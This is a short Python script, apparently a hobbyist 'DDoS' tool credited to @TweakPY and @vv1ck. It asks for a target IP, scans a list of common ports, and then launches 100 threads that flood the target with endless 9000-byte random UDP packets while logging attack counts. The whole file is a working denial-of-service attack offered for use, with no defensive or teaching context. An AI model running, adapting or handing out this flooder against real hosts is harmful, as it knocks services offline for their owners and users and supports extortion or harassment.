try:import socket,random,colorama,threading;from colorama import Fore
except ModuleNotFoundError:exit('[!] Download The Missing Module !')
print(f"""{Fore.GREEN}{colorama.Back.BLACK}
⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
   ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
⠀⠀⢤⣀⣀⣁⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
{Fore.RESET}
By @TweakPY - @vv1ck
""")
ip=input(f"{Fore.LIGHTRED_EX}[{Fore.LIGHTWHITE_EX}?{Fore.LIGHTRED_EX}] {Fore.RED}Target IP : "+Fore.RESET)
ports=[1,5,7,18,20,21,22,23,25,43,42,53,80,109,110,115,118,443,194,161,445,156,137,139,3306];portlast=[]#WACNS
print(Fore.LIGHTRED_EX+"\n- Scanning open ports ...")
for port in ports:
	a_socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	a_socket.settimeout(2)
	result_of_check=a_socket.connect_ex((ip,port))
	a_socket.settimeout(None)
	if result_of_check==0:portlast.append(port)
	else:pass
	a_socket.close()
print(f"{Fore.LIGHTRED_EX}[{Fore.GREEN}*{Fore.LIGHTRED_EX}] {Fore.RED}Opened ports: {len(portlast)}"+Fore.RESET)
if len(portlast)==0:print(Fore.LIGHTRED_EX+"- Can't start the attack due to 0 opened ports");exit()
else:pass
def ddos():
	bytes=random._urandom(9000);c=0
	while True:
		try:
			s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.sendto(bytes,(ip,port))
			s.close()
			print(Fore.LIGHTGREEN_EX+f"[+] Done Attack: {ip}:{port}  | Count : {c}");c+=1
		except:print(Fore.LIGHTRED_EX+f"[-] Failed Attack: {ip}:{port}  | Count : {c}");c+=1
for i in range(int(100)):
	threading.Thread(target=ddos).start()
